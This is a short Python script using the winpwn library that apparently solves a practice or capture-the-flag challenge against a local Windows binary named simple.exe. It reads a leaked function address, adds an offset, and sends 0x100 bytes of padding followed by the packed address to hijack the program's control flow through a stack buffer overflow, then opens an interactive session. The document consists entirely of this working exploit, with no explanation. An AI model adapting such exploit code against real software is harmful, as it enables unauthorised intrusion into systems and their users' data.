from winpwn import *

context.arch = 'amd64'
context.windbg = "C:\\Users\\kruztw\\AppData\Local\\Microsoft\\WindowsApps\\WinDbgX.exe"

r = process("./simple.exe")

r.recvuntil(' @ ')
win_addr = int(r.recvline().strip(), 16)
print("win_addr @ ", hex(win_addr))

#windbg.attach(r)
#input('~0s;'+'gu;'*24)

r.sendline('a'*0x100 + p64(win_addr-0x4e1+0xbb2))
r.interactive()